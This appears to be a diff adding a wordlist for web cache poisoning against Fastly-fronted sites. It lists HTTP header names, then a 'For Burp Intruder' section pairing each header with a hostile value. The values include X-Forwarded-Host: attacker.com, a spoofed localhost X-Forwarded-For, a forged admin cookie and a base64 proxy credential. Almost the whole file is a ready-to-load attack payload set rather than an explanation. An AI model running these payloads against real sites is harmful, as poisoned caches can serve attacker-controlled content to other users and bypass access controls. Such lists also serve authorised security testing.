@@ -1,0 +1,107 @@
+Accept
+Accept-Encoding
+Accept-Language
+Age
+Alt-Svc
+CDN-Loop
+Cache-Control
+Content-Length
+Content-Range
+Cookie
+Date
+Expect
+Expires
+Fastly-Cachetype
+Fastly-Client
+Fastly-Client-IP
+Fastly-Cookie-Overflow
+Fastly-Debug
+Fastly-Debug-Digest
+Fastly-Debug-Path
+Fastly-Debug-TTL
+Fastly-FF
+Fastly-Force-Shield
+Fastly-IO-Error
+Fastly-IO-Info
+Fastly-IO-Warning
+Fastly-Key
+Fastly-No-Shield
+Fastly-SSL
+Fastly-Stats
+Host
+Proxy-Authenticate
+Proxy-Authorization
+Surrogate-Control
+Surrogate-Key
+TE
+Trailer
+Transfer-Encoding
+Upgrade
+Vary
+X-Cache
+X-Cache-Hits
+X-Compress-Hint
+X-Fastly-Imageopto-API
+X-Fastly-Imageopto-Montage
+X-Fastly-Imageopto-Overlay
+X-Forwarded-For
+X-Forwarded-Host
+X-Forwarded-Server
+X-Served-By
+X-Timer
+X-Varnish
+
+
+For Burp Intruder
+Accept: text/html;q=0.9, */*;q=0.8; poison
+Accept-Encoding: gzip, deflate, br, poison
+Accept-Language: en-US,en;q=0.5; poisoned
+Age: 999999
+Alt-Svc: h2="poisoned.alt.service:443"
+CDN-Loop: fastly
+Cache-Control: no-cache, poisoned
+Content-Length: 12345
+Content-Range: bytes 0-1023/2048
+Cookie: session=poisonedcookie; user=admin
+Date: Wed, 10 Jul 2025 13:37:00 GMT
+Expect: 100-continue
+Expires: Wed, 21 Oct 2037 07:28:00 GMT
+Fastly-Cachetype: edge
+Fastly-Client: attack-client
+Fastly-Client-IP: 6.6.6.6
+Fastly-Cookie-Overflow: true
+Fastly-Debug: enable-poison-debug
+Fastly-Debug-Digest: deadbeef123456
+Fastly-Debug-Path: /test/poison/path
+Fastly-Debug-TTL: 999
+Fastly-FF: forward-poison
+Fastly-Force-Shield: on
+Fastly-IO-Error: yes
+Fastly-IO-Info: corrupted
+Fastly-IO-Warning: critical
+Fastly-Key: cache-buster-poison-key
+Fastly-No-Shield: 1
+Fastly-SSL: evil-ssl
+Fastly-Stats: p0wn3d
+Host: target.com
+Proxy-Authenticate: Basic realm="fake-realm"
+Proxy-Authorization: Basic cG9pc29uOmF0dGFjaw==
+Surrogate-Control: max-age=999999, poisoned
+Surrogate-Key: poison-page-key
+TE: gzip
+Trailer: X-Final-Poison
+Transfer-Encoding: chunked
+Upgrade: h2c
+Vary: Accept-Encoding, Poison-Header
+X-Cache: HIT poisoncache
+X-Cache-Hits: 666
+X-Compress-Hint: on
+X-Fastly-Imageopto-API: /imgapi/poisoned
+X-Fastly-Imageopto-Montage: broken-collage
+X-Fastly-Imageopto-Overlay: evil-layer
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: attacker.com
+X-Forwarded-Server: hacked-server
+X-Served-By: cache-poison123
+X-Timer: S1627500000.123456,VS0,VE1
+X-Varnish: 999999
